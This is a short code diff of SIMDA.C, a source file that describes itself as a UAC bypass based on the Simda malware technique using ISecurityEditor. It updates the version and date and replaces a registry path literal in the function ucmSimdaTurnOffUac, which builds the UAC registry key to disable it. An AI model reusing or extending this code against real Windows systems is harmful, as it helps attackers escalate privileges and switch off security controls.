@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     2.71
+*  VERSION:     2.85
 *
-*  DATE:        08 May 2017
+*  DATE:        01 Dec 2017
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -132,7 +132,7 @@ BOOL ucmSimdaTurnOffUac(
 
         RtlSecureZeroMemory(&ustr, sizeof(ustr));
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, L"\\REGISTRY\\");
+        _strcpy(szBuffer, T_REGISTRY_PREP);
         _strcat(szBuffer, T_UACKEY);
         RtlInitUnicodeString(&ustr, szBuffer);
         InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
